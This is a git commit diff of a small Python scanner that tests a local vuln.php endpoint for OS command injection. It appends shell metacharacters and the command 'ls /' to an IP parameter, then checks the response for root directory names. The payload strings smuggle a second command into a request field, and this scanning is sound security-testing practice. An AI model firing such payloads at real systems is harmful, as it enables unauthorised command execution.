0687f4f6a8104c156e482796121db0add51f8160
pranav10780 <pranavsuresh107@gmail.com>
2025-05-28 16:14:52 +0530

    done the auto injection identifier

--- scanner.py
+++ scanner.py
@@ -1,16 +1,15 @@
 import requests
 url = "http://localhost:8000/vuln.php"
 ip="127.0.0.1"
-cmd="nonexistentcommand123"
-expected_error = "command not found"
-shell_metacharacters = [';','|','&','&&','||','$','>','>>','<','`','$()','\\','*','?','~','(', ')','[', ']','\n','\r','\x00',]
+cmd="ls /"
+shell_metacharacters = [';','|','&','&&','||','$','>','>>','<','`','$()','\\','*','?','~','(', ')','[', ']','\n','\r']
+outputs=['tmp','bin','boot','data','etc']
 print("[*] Scanning for command injection vulnerabilities...\n")
 for i in shell_metacharacters:
     payload = ip + i + cmd
     response = requests.get(url, params={'ip': payload})
-    indicators = ['index.php', 'vuln.php', 'scanner.py', '.php', '.py', 'README', 'htdocs']  # Adjust to match your dir
-    if expected_error in response.text:
-        print(f"[!!] Injection likely with metacharacter '{i}'")
-        print(f"     Payload: {payload}")
-        print("     Matched error message in response.")
-        print("-" * 60)
+    for j in outputs:
+        if j in response.text:
+            print(f"[!!] Injection likely with metacharacter '{i}'")
+            print(f"     Payload: {payload}")
+            print("-" * 60)
